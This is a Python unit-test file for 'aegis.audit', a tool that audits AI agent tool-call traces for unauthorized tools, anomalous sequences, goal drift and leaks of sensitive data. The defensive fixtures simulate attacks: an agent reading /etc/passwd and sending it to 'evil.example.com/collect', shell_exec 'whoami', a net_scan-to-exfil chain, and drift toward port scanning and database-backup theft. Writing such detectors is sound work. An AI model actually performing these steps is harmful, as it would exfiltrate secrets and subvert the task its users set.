"""aegis.audit 单元测试：三级越权检测、目标漂移、标签传播。"""

from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from aegis.audit import (  # noqa: E402
    BaselineBuilder,
    ChainAuditDetector,
    DataLabel,
    RiskLevel,
    ToolCallEvent,
    TraceRecorder,
)


def _legit_traces(n: int = 5) -> list[list[ToolCallEvent]]:
    traces = []
    for i in range(n):
        rec = TraceRecorder()
        rec.start_task(f"t{i}", intent="整理会议纪要并发送内部邮件")
        rec.record("read_doc", {"path": "a.docx"}, DataLabel.INTERNAL, subgoal="读取纪要")
        rec.record("summarize", {"doc": "a"}, DataLabel.INTERNAL, refs_data_from=(1,), subgoal="生成摘要")
        rec.record("send_email", {"to": "team"}, DataLabel.INTERNAL,
                   destination="internal://mail", refs_data_from=(2,), subgoal="发送邮件")
        traces.append(rec.events)
    return traces


def _detector() -> ChainAuditDetector:
    baseline = BaselineBuilder().fit(_legit_traces())
    return ChainAuditDetector(baseline=baseline)


def test_l1_unauthorized_tool():
    det = _detector()
    rec = TraceRecorder()
    rec.start_task("atk1")
    rec.record("read_doc", {"path": "a.docx"}, DataLabel.INTERNAL)
    rec.record("shell_exec", {"cmd": "whoami"}, DataLabel.PUBLIC)
    report = det.audit(rec.events, authorized_tools={"read_doc", "summarize", "send_email"})
    l1 = [e for e in report.risk_events if e.level == "L1_permission" and e.tool == "shell_exec"]
    assert l1 and l1[0].risk is RiskLevel.HIGH
    assert not report.passed


def test_l1_sensitive_param_flagged():
    det = _detector()
    rec = TraceRecorder()
    rec.start_task("atk2")
    rec.record("read_doc", {"path": "a.docx", "password": "x"}, DataLabel.INTERNAL)
    report = det.audit(rec.events, authorized_tools={"read_doc"})
    assert any("敏感" in e.detail for e in report.risk_events if e.level == "L1_permission")


def test_l3_sensitive_exfiltration_blocked():
    """SECRET 标签沿引用链传播，流向外部地址 → critical + 熔断（审计链路 S3 第三级/S5）。"""
    det = _detector()
    rec = TraceRecorder()
    rec.start_task("atk3")
    rec.record("read_doc", {"path": "a.docx"}, DataLabel.INTERNAL)
    ev2 = rec.record("read_file", {"path": "/etc/passwd"}, DataLabel.SECRET)
    rec.record("send_email", {"to": "x"}, DataLabel.PUBLIC,
               destination="https://evil.example.com/collect", refs_data_from=(ev2.seq,))
    report = det.audit(rec.events, authorized_tools={"read_doc", "read_file", "send_email"})
    l3 = [e for e in report.risk_events if e.level == "L3_dataflow"]
    assert l3 and any(e.risk is RiskLevel.CRITICAL for e in l3)
    assert any(e.disposal.value == "fuse" for e in l3)


def test_l3_label_propagation_via_refs():
    """数据本身不敏感，但引用了 SECRET 返回值的调用应继承标签（设计要点 4 标签传播）。"""
    det = _detector()
    rec = TraceRecorder()
    rec.start_task("atk4")
    rec.record("read_file", {"path": "/etc/passwd"}, DataLabel.SECRET)
    rec.record("summarize", {"text": "..."}, DataLabel.PUBLIC, refs_data_from=(1,))
    report = det.audit(rec.events, authorized_tools={"read_file", "summarize"})
    # summarize 不在基线 SECRET 数据流白名单中 → L3 违规
    assert any(e.level == "L3_dataflow" and e.tool == "summarize" for e in report.risk_events)


def test_l2_sequence_anomaly():
    det = _detector()
    rec = TraceRecorder()
    rec.start_task("atk5")
    for tool in ["read_doc", "net_scan", "shell_exec", "exfil"]:
        rec.record(tool, {}, DataLabel.PUBLIC)
    report = det.audit(rec.events)  # 不传授权清单，走基线
    assert any(e.level == "L2_sequence" for e in report.risk_events)


def test_goal_drift_detected():
    det = _detector()
    subgoals = ["读取会议纪要", "扫描内网开放端口", "批量下载数据库备份"]
    risks = det.check_drift("整理会议纪要并发送内部邮件", subgoals)
    assert risks and risks[0].level == "goal_drift"


def test_legit_trace_passes():
    det = _detector()
    trace = _legit_traces(1)[0]
    report = det.audit(trace, authorized_tools={"read_doc", "summarize", "send_email"},
                       original_intent="整理会议纪要并发送内部邮件",
                       subgoals=["读取纪要", "生成摘要", "发送邮件"])
    assert report.passed
    assert report.max_risk is RiskLevel.LOW or all(e.risk is RiskLevel.LOW for e in report.risk_events)
